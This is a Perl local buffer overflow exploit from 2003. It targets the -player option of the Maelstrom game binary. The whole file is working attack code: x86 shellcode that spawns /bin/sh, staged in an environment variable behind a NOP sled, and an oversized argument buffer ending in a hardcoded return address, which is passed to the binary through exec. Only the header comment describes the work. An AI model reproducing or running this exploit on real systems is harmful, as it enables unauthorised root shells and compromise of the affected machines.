#!/usr/bin/perl -w
#
# /usr/bin/Maelstrom -player Local Buffer Overflow Exploit by akcess
#
# This code exploits the -player overflow which i discovered after
# reading the initial advisory detailing  the -server  overflow by
# Luca Ercoli
#
# [ akcess@linuxmail.org ] - *21/05/03*


$sc = "\x90"x1500; # write stdout "akcess wuz here..."; execve /bin/sh; exit;
$sc .= "\x31\xc0\x31\xdb\x31\xd2\x53\x68\x2e\x2e\x20\x0a\x68\x65\x72\x65";
$sc .= "\x2e\x68\x75\x7a\x20\x68\x68\x73\x73\x20\x77\x68\x61\x6b\x63\x65";
$sc .= "\x89\xe1\xb2\x18\xb0\x04\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68";
$sc .= "\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24";
$sc .= "\xb0\x0b\xcd\x80";

$ENV{'SC'} = $sc;

$offset = "0";
$ret = 0xbffff9ee;


for ($i = 0; $i < (8177 - 4); $i++) {
    $buf .= "\x90";
}


$buf .= pack('l', ($ret + $offset));

print("Using return address: 0x", sprintf('%lx',($ret + $offset)),"\n");
exec("/usr/bin/Maelstrom -player 1\@'$buf'");